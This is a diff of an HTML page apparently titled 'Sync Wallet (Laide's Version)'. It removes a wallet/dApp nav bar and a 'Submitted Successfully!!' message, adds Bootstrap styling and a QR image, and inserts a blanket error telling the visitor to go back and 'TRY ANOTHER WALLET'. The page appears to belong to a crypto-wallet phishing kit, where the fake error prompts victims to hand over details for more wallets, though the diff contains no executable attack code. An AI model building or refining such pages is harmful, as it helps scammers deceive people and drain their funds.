@@ -10,28 +10,36 @@
       integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
       crossorigin="anonymous"
     />
-    <script
-      src="https://kit.fontawesome.com/b3d6ee144c.js"
-      crossorigin="anonymous"
-    ></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"
+    />
+
+    <style>
+      .qr-code {
+        max-width: 250px;
+        margin: 10px;
+        position: absolute;
+        left: 0;
+      }
+    </style>
     <!-- <script src="/static/index.js"></script> -->
     <link rel="stylesheet" href="/static/index.css" />
     <title>Sync Wallet (Laide's Version)</title>
   </head>
   <body>
     <div class="container-fluid">
-      <header class="header">
-        <nav class="nav">
-          <p><a href="/index.html" class="nav-link">Wallets</a></p>
-          <p>
-            <a href="#" class="nav-link"
-              ><img src="/images/iogo.jpg" alt="centered logo"
-            /></a>
-          </p>
-          <p><a href="/index.html" class="nav-link">dApps</a></p>
-        </nav>
-      </header>
-      <p class="thanks">Submitted Successfully!!</p>
+      <p>
+        Error processing your request, Kindly go back and try again. IF ERROR
+        PERSISTS, KINDLY TRY ANOTHER WALLET
+      </p>
+      <div class="text-center">
+        <img
+          src="https://chart.googleapis.com/chart?cht=qr&chl=Hello+World&chs=160x160&chld=L|0"
+          class="qr-code img-thumbnail img-responsive"
+        />
+      </div>
     </div>
+    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
   </body>
 </html>
